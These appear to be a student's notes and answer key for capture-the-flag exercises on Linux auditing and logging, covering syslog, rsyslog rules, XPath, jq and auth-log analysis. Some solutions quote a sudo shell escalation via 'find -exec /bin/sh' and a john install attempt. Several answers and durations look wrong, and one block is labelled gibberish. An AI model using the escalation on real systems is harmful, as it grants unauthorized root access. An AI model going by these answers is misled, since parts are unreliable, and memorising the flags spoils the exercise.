awk '/<host>/ {rec=""; ip=""; f=0} /<host>/,/<\/host>/ {rec = rec $0 ORS} /<state state="open"/ {f=1} /<\/host>/ {if (f) print rec}' /home/garviel/output.xml | \
grep -oP 'addr="\K[^"]*' | \
tr -d '\n' | \
md5sum



awk '
BEGIN { RS="</host>"; FS="\n"; OFS="" }
/state="open"/ {
  for (i=1; i<=NF; i++) {
    if ($i ~ /<address addr=/) {
      gsub(/.*addr="|".*/, "", $i);
      printf $i
    }
  }
}
' /home/garviel/output.xml | md5sum



######################################################################################################################################################
######################################################                                             ###################################################
######################################################        14_linux_auditing_and_logging        ###################################################
######################################################                                             ###################################################
######################################################################################################################################################


######################################################### Linux Auditing and Logging XML 1 5 #########################################################

File: /home/garviel/output.xml

Identify the XML element name in the output below

<scaninfo type="syn" protocol="tcp" numservices="200" services="1-200"/>

Flag: The element, with start and end tags


*********************************************************     SOLUTION        **********************************************************

<scaninfo>

######################################################### Linux Auditing and Logging XML 2 5 #########################################################

Identify one of the XML attributes in the output below

<scaninfo type="syn" protocol="tcp" numservices="200" services="1-200"/>

Flag format: value="pair"

*********************************************************     SOLUTION        **********************************************************

numservices="200"

######################################################### Linux Auditing and Logging Standards 1 5 #########################################################

What RFC is Syslog?

*********************************************************     SOLUTION        **********************************************************

RFC 5424 

######################################################### Linux Auditing and Logging Standards 2 5 #########################################################

Challenge only allows 3 attempts

What is the numerical code assigned to the facility dealing with authorization?

*********************************************************     SOLUTION        **********************************************************

4

######################################################### Linux Auditing and Logging Standards 3 5 #########################################################

Challenge only allows 3 attempts

How many severity codes are defined in the standard that defines syslog?

*********************************************************     SOLUTION        **********************************************************

8

######################################################### Linux Auditing and Logging Standards 4 5 #########################################################

Challenge only allows 3 attempts

What severity is assigned to system instability messages?

Hint: Use the numerical code!

*********************************************************     SOLUTION        **********************************************************

0

######################################################### Linux Auditing and Logging Syslog 1 5 #########################################################

Challenge only allows 3 attempts

Download the attached rsyslog configuration file for the Syslog # challenges.

In the legacy rules section of the file, what facility is logged to 0.log?

*********************************************************     SOLUTION        **********************************************************

0

######################################################### Linux Auditing and Logging Syslog 2 5 #########################################################

Challenge only allows 3 attempts

In the legacy rules section of the file, how many severities are logged to 0.log?

Flag: Total number of severities

*********************************************************     SOLUTION        **********************************************************

8 severities as it includes all 

######################################################### Linux Auditing and Logging Syslog 3 5 #########################################################

In the legacy rules section of the file, how many severities are logged to 4min.log?

List the severities from highest severity (lowest numerical listed) to lowest severity (highest numerical listed) using their severity name.

Flag format: name,name,name

*********************************************************     SOLUTION        **********************************************************

emergency,alert,critical,error,warning

######################################################### Linux Auditing and Logging Syslog 4 5 #########################################################

In the legacy rules section of the file, how many severities are logged to 4sig.log?

List the severities from highest severity (lowest numerical listed) to lowest severity (highest numerical listed), using their severity name.

Flag format: name,name,name

Hint: I’m sure they made a man page for this. Read the downloaded file for some links.

*********************************************************     SOLUTION        **********************************************************

! implies that its greater than and not inclusive of the number provided.

Notice,Informational,Debug

######################################################### Linux Auditing and Logging Syslog 5 5 #########################################################

Challenge only allows 3 attempts

What is being logged in not.log?

Provide the facilities from lowest facility to highest facility numerically, and the severity being logged. (List only the first word for each.)

Flag format: facility,facility,facility,severity

*********************************************************     SOLUTION        **********************************************************

https://success.trendmicro.com/dcx/s/solution/TP000086250?language=en_US

mail,clock,NTP,notice

######################################################### Linux Auditing and Logging Syslog 6 5 #########################################################

Challenge only allows 3 attempts

What facilities and what severities are being sent to a remote server over a reliable connection using port 514?

Provide the facility names, number of severities, and the correct destination IP address.

Flag format: F,F,#,IP

*********************************************************     SOLUTION        **********************************************************

@@ -> indicates tcp connections which is a reliable connection! 

Auth,authpriv,8,10.30.0.1 

######################################################### Linux Auditing and Logging Syslog 7 5 #########################################################

Challenge only allows ONE attempt

Use the answer from Syslog 6 for this question.

Do logs that match this filter ever get saved on the local machine?

*********************************************************     SOLUTION        **********************************************************

auth,authpriv.*		-/var/log/auth.log
*.*;auth,authpriv.none		-/var/log/syslog
auth,authpriv.*                @@10.30.0.1:514

authpriv is given the value 10.30.0.1:514 and assigned tcp then sent out on auth,authpriv.*		-/var/log/auth.log ---> this implies it is getting saved. 
The answer is thus yes.


######################################################### Linux Auditing and Logging Syslog 8 5 #########################################################


What messages are being sent to 10.84.0.1?

Provide the facility number, the number (amount) of severity codes, and Layer 4 connection type as the answer.

Flag format: F,S,Layer 4 connection Type


*********************************************************     SOLUTION        **********************************************************

kern,7,udp

######################################################### Linux Auditing and Logging Standards 1 5 #########################################################

File: /home/garviel/output.xml

Parse all of the IP addresses from the file using XPATH queries

https://www.w3schools.com/xml/xpath_intro.asp

HINT:
http://xpather.com/
http://www.whitebeam.org/library/guide/TechNotes/xpathtestbed.rhtm

Sample Output (without piping to MD5SUM)



 addr="XXX.xxx.xxx.xxx"
 addr="XXX.xxx.xxx.xxx"
 addr="XXX.xxx.xxx.xxx"
 addr="XXX.xxx.xxx.xxx"
 addr="XXX.xxx.xxx.xxx"
 addr="XXX.xxx.xxx.xxx"

--TRIMMED--


Flag format: md5 hash of output


*********************************************************     SOLUTION        **********************************************************

Parse all of the IP addresses from the file using XPATH queries

To parse the IP address use the following command:

xpath -q -e '//element/@attribute' file.xml

In our case: xpath -q -e '//address/@addr' output.xml

To get the md5 hash

xpath -q -e '//address/@addr' output.xml | md5sum

Ans: 0e850f14fc192c5105955ec094287bd2 

######################################################### Linux Auditing and Logging XML 4 10 #########################################################

File: /home/garviel/output.xml

Select all of the IP addresses and ports using a single XPATH Union Statement

Pipe the result to md5sum for the flag

HINT:

https://librarycarpentry.org/lc-webscraping/02-xpath/index.html
http://www.tizag.com/xmlTutorial/xpathbar.php
Sample Output (without piping to MD5SUM)



 addr="xx.xxx.xx.xx"
 addr="xx.xxx.xx.xx"
 addr="xx.xxx.xx.xx"
 addr="xx.xxx.xx.xx"
 portid="xx"
 addr="10.50.29.6"
 addr="xx.xxx.xx.xx"
 portid="22"

--TRIMMED--

*********************************************************     SOLUTION        **********************************************************

To combine two information we use “|”

xpath -q -e '//address/@addr | //port/@portid' output.xml

Now, to get the hash: xpath -q -e '//address/@addr | //port/@portid' output.xml | md5sum

ff7990139b6d09aa65afb6e069db0dec http://www.tizag.com/xmlTutorial/xpathbar.php

######################################################### Linux Auditing and Logging JSON 1 10 #########################################################

File: /home/garviel/conn.log

Use jq to pretty print the JSON file conn.log.

Hash the pretty-printed file with md5sum for the flag.

Sample JSON "Pretty Print" Output (without piping to MD5SUM)


  "ts": 1615383120.585641,
  "uid": "C9ybUDHykHdrh0h93",
  "id.orig_h": "10.50.24.73",
  "id.orig_p": 38156,
  "id.resp_h": "192.168.65.20",
  "id.resp_p": 443,
  "proto": "tcp",
  "duration": 2.8133392333984375e-05,
  "orig_bytes": 0,
  "resp_bytes": 0,

HINT:

https://jqplay.org/

https://docs.jsonata.org/simple

https://stedolan.github.io/jq/manual/



*********************************************************     SOLUTION        **********************************************************

To read the jason file:

jq . File.json, In our case: jq . conn.log

To get md5 jq . conn.log | md5sum

25ebedf7442e470eaaa48b5f7d5b96f4

######################################################### Linux Auditing and Logging JSON 2 10 #########################################################

File : /home/garviel/conn.log

This file is a conn.log made in Zeek (Bro) with data about TCP/IP connections.

Use jq to locate and count the unique originating endpoint IP addresses in the file. Enter the number of unique originating IP addresses as the flag.

Flag format: #

HINT: Use this link to understand the JSON object’s attributes


*********************************************************     SOLUTION        **********************************************************

d.orig_h addr Originating endpoint’s IP address

Here, in JSON file anything after . Is being read. So, for this example we have:

jq '."id.orig_h"' conn.log = This reads just the id.orig_h from thefile

Now to sort the file for unique IP address:

jq '."id.orig_h"' conn.log | sort | uniq | wc -l

31

######################################################### Linux Auditing and Logging JSON 3 10 #########################################################

File: /home/garviel/conn.log

This file is a conn.log made in Zeek (Bro) with data about TCP/IP connections.

Use jq to locate and count connections where the destination IP sent more than 40 bytes to the source IP.

Flag format: #



*********************************************************     SOLUTION        **********************************************************

Destination IP = id.resp_h addr Responding endpoint’s IP address (AKA RESP)

Destination ip bytes, the element we are looking for is resp_ip_bytes.

To get the output of thr response bytes: jq '."resp_ip_bytes" ' conn.log

- this gives us all the bytes. But we just need over 40. So we use awk command

jq '."resp_ip_bytes" ' conn.log | awk '$1 > 40' --- this gives us bytes over 40

Here $1 = we are only looking for column 1,

To count the output:

garviel@terra:~$ jq '."resp_ip_bytes" ' conn.log | awk '$1 > 40' | wc -l

177 https://www.geeksforgeeks.org/awk-command-unixlinux-examples/ 

######################################################### Linux Auditing and Logging Standards 1 5 #########################################################

Challenge only allows ONE attempt

Which cron log severity code is saved only to the local machine?

Flag format: #

(Continue to reference your 50-cctc.conf file from Syslog1)


*********************************************************     SOLUTION        **********************************************************

cron.!=7                       @10.66.0.1:514
cron.=7                        -/var/log/crondbg.log

Answer will be 7

######################################################### Linux Auditing and Logging Syslog 10 10 #########################################################

Challenge only allows 3 attempts

The emergency messages (only) on the system are sent to what IP Address?

(Continue to reference your 50-cctc.conf file from Syslog1)


*********************************************************     SOLUTION        **********************************************************

*.=emerg			action(type="omfwd" Target="10.24.0.1" Port="20514" Protocol="tcp" Device="eth0")

10.24.0.1

######################################################### Linux Auditing and Logging Whut 1 10 #########################################################

Use the log file attached to this for all Whut questions.

How many unique users logged into this machine?

*********************************************************     SOLUTION        **********************************************************

control f and count the number of 'user' in the txt file. 

######################################################### Linux Auditing and Logging Whut 2 10 #########################################################

What is the total amount of time users were logged into the machine?

Flag format: #h,#m (Replace the # with a number)

*********************************************************     SOLUTION        **********************************************************

Frodo ->  Apr 6 00:00:03 (start time )
Disconnected -> Apr 6 01:15:02

1 hours	12 minutes	

Balrog -> Apr 6 09:35:50
Disconnected -> Apr 6 10:26:41

51 minutes

Saruman -> Apr 6 13:34:17

Disconnected -> Apr 6 13:53:21

19 minutes

Saruman -> Apr 6 13:58:20

Disconnected -> Apr 6 16:43:21

2 hours 45 minues



totals to 5 hours, 10 minutes,,, 5h,10m

######################################################### Linux Auditing and Logging Whut 3 10 #########################################################

Identify the Cyber Attack Technique that Balrog is trying on the machine.

HINT: https://attack.mitre.org/

*********************************************************     SOLUTION        **********************************************************


Apr 6 10:11:40 linux-opstation-7qhp sudo: pam_unix(sudo:auth): auth could not identify password for [Balrog]
Apr 6 10:11:41 linux-opstation-7qhp sudo: Balrog : command not allowed ; TTY=pts/0 ; PWD=/home/Balrog ; USER=root ; COMMAND=apt install john -y

Credential Access


######################################################### Linux Auditing and Logging XML 5 15 #########################################################


File: /home/garviel/output.xml

Select every IP address with open (in use) ports using XPATH queries and XPATH axes.

Pipe the result to md5sum for the flag

Sample Output (without piping to MD5SUM)

 addr="10.50.29.5"
 portid="xx"
 addr="xx.xx.xx.xx"
 portid="xx"

--TRIMMED--

*********************************************************     SOLUTION        **********************************************************

xpath -q -e '//host[ports/port/state/@state]/address/@addr |  //host/ports/port/@portid' output.xml | md5sum


(((((((((((((((((((((((((((( ********** GIBERISH *******))))))))))))))))))))))))))))

grep -E '(addr|portid)' /home/garviel/output.xml | sed -n '/addr=/p' | sed 's/.*addr="\([^"]*\).*/\1/' | tr -d '\n' | md5sum


xpath -q -e //host[ports/port/state/@state='open']/address/@addr output.xml

xpath -q -e //host/ports/port/@portid output.xml

<port protocol="tcp" portid="22"><state state="open" reason="syn-ack" reason_ttl="126"/><service name="ssh" method="table" conf="3"/></port>





<host starttime="1615316703" endtime="1615317103"><status state="up" reason="user-set" reason_ttl="0"/>
    <address addr="10.50.29.7" addrtype="ipv4"/>

    <hostnames>
    </hostnames>

    <ports>
        <extraports state="closed" count="199">
            <extrareasons reason="resets" count="199"/>
        </extraports>


        <port protocol="tcp" portid="22">
            <state state="open" reason="syn-ack" reason_ttl="62"/>
            <service name="ssh" method="table" conf="3"/>
        </port>


    </ports>
    <times srtt="2096" rttvar="237" to="50000"/>

</host>

xmllint --xpath "//host[ports/port/state/@state='open']/address/@addr" your_xml_file.xml | sed 's/addr="//g' | sed 's/"//g' > output.txt

grep -E '(addr|portid)' /home/garviel/output.xml | sed -n '/addr=/p' | sed 's/.*addr="\([^"]*\).*/\1/' | tr -d '\n' | md5sum

grep -E 'addr=|state="filtered"' /home/garviel/output.xml | \
awk '/addr=/ {ip=$0; next} /state="filtered"/ {print ip; ip=""}' | \
sed -e 's/.*addr="\([^"]*\).*/\1/' | \
tr -d '\n' | \
md5sum

grep -E 'addr=|state=' /home/garviel/output.xml | \
grep -v 'state="closed"' | \
awk '/addr=/ {ip=$0; next} /state=/ {print ip; ip=""}' | \
sed -e 's/.*addr="\([^"]*\).*/\1/' | \
tr -d '\n' | \
md5sum





awk '/<host>/ {rec=""; ip=""; f=0} /<host>/,/<\/host>/ {rec = rec $0 ORS} /<state state="open"/ {f=1} /<\/host>/ {if (f) print rec}' /home/garviel/output.xml | \
grep -oP 'addr="\K[^"]*' | \
tr -d '\n' | \
md5sum



awk '
BEGIN { RS="</host>"; FS="\n"; OFS="" }
/state="open"/ {
  for (i=1; i<=NF; i++) {
    if ($i ~ /<address addr=/) {
      gsub(/.*addr="|".*/, "", $i);
      printf $i
    }
  }
}
' /home/garviel/output.xml | md5sum


######################################################### Linux Auditing and Logging Whut 4 15 #########################################################

Challenge only allows ONE attempt

What user successfully executed commands?

*********************************************************     SOLUTION        **********************************************************

Apr 6 13:35:00 linux-opstation-7qhp systemd: pam_unix(systemd-user:session): session opened for user Saruman by (uid=0)
Apr 6 13:35:01 linux-opstation-7qhp sudo: Saruman : TTY=pts/0 ; PWD=/home/Saruman ; USER=root ; COMMAND=find /var/tmp -type f
Apr 6 13:35:02 linux-opstation-7qhp sudo: pam_unix(sudo:session): session opened for user root by Saruman(uid=0)

Saruman was the only one that could run sudo commands 


######################################################### Linux Auditing and Logging Whut 5 15 #########################################################

Analyze the file to determine when a shell was spawned as a different user and how long it was maintained for.

Provide the :
duration the shell was maintained
the command used to create it
number of times they [successfully] escalated
Flag Format: #h,#m,command,number of times

Round minutes up to the closest number divisible by 10.

*********************************************************     SOLUTION        **********************************************************

cat log.txt | grep "exec"

Look for binary /bin/sh 

Apr 6 13:37:31 linux-opstation-7qhp sudo: Saruman : TTY=pts/0 ; PWD=/home/Saruman ; USER=root ; COMMAND=find /etc/passwd -exec /bin/sh {} ;

2h,30m,find /etc/passwd -exec /bin/sh \;,2
